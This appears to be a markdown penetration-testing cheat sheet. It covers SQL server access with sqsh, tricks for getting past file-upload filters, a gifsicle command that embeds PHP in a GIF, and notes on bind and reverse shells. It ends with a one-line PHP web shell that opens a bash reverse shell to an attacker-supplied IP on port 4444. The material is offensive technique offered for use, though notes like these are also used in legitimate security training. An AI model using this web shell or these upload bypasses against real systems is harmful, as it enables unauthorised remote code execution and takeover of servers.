# Exploit  
## SQL Injection

Kali has a command-line tool that can interact with SQL databases. It is not installed by default.    
```
apt-get install sqsh freetds-bin freetds-common freetds-dev
```
For any database, make sure to update server info at  
```
/etc/freetds/freetds.conf
```
and authentication info at:
```
 ~/.sqshrc
 ```
 To connect to a SQL server:  
```
 sqsh -S ServerName
 ```

## File upload
**Bypass rules**
- Missed extensions of the same file type
- Insert double extension
- Fake directory structure (file attack.jpg is php, send /attack.jpg/foo.php)
- Change case of extension (pHp, PhP, aSp)
- ***Windows***: use shortname
- Neutral characters that are removed automatically
  - ***Windows***: spaces
  - ***Linux***: trailing dots
**Image check abuse**
```
apt-get install gifsicle
gifsicle < trojan.gif -- comment "<?php echo 'Current PHP version: ' . phpversion(); ?>" > output.php.gif
```
## Shells
- ***Shell***: Piece of code that enables one to interact with a system.
- ***Bind vs. Reverse bind***: Bind listens to a port and gives a shell to whom it connects. Reverse bind sends a shell to someone listening to a port somewhere else.

### Shellcode


**Notes**: 
- ***Msfvenom***: Full reference (Offensive Security Metasploit Unleashed [Msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/))  

### Web Shells

**PHP Webshell (bash)**
```
<?php echo shell_exec("bash -i >& /dev/tcp/<attackerIp>/4444 0>&1"); ?>
```